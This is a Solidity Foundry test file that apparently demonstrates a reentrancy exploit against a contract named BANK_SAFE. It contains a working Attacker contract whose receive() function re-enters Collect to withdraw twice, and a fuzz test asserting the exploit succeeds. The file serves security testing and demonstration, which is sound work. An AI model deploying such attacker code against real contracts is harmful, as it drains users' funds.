
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE, LogFile} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {

    BANK_SAFE public bank;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        bank = new BANK_SAFE();
        bank.SetLogFile(address(log));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 minSum) public {
        
        vm.assume(minSum > 0);
        vm.assume(attackVal > 0);
        vm.assume(attackVal < minSum);
        vm.assume(2 * attackVal >= minSum);
        vm.assume(attackVal <= type(uint128).max / 2);
        vm.assume(minSum <= type(uint128).max / 2);
        

        bank.SetMinSum(minSum);
        bank.Initialized();
        

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        bank = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        bank.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = bank.balances(address(this));
        
        storedVal = val;

        uint256 initialEth = address(this).balance;

        bank.Collect(val);

        uint256 finalEth = address(this).balance;
        uint256 finalBalance = bank.balances(address(this));

        if (attackCallCount == 2 && finalBalance == 0 && finalEth == initialEth + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.Collect(storedVal);
        }
    }
}
